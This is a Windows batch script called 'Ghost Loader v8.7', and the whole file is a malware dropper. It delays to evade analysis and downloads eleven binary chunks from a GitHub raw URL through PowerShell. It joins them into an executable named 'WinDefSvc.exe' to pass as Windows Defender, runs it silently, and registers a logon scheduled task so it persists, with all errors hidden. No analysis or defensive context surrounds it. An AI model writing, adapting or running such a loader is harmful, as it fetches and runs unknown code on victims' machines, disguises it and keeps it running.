@echo off
setlocal enabledelayedexpansion

:: Ghost Loader v8.7 - FORCE UPDATE VERSION
:: Always re-downloads chunks to ensure latest version

set "repo=https://raw.githubusercontent.com/sophieduval/der/main"
set "dest=%LOCALAPPDATA%\WinDefSvc"
set "exe=WinDefSvc.exe"

:: Anti-analysis delay
ping -n 5 127.0.0.1 >nul 2>&1

:: DELETE OLD FILES AND CREATE FRESH DIRECTORY
if exist "%dest%" rmdir /s /q "%dest%" 2>nul
mkdir "%dest%" 2>nul
cd /d "%dest%"

:: Download ALL chunks (forced)
for /l %%i in (0,1,10) do (
    set "idx=%%i"
    if %%i LSS 10 set "idx=0%%i"
    set "fn=blob_!idx!.dat"
    powershell -Command "$wc=New-Object System.Net.WebClient; $wc.DownloadFile('%repo%/!fn!','%dest%\!fn!')" 2>nul
)

:: Verify
if not exist "blob_00.dat" exit /b 1

:: Reassemble
copy /b blob_00.dat+blob_01.dat+blob_02.dat+blob_03.dat+blob_04.dat+blob_05.dat+blob_06.dat+blob_07.dat+blob_08.dat+blob_09.dat+blob_10.dat "%exe%" >nul 2>&1

:: Execute
start "" "%exe%" 2>nul

:: Persistence
powershell -Command "$a=New-ScheduledTaskAction -Execute '%dest%\%exe%';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName 'WinDefSvc' -Action $a -Trigger $t -Force" >nul 2>&1

timeout /t 2 >nul
exit
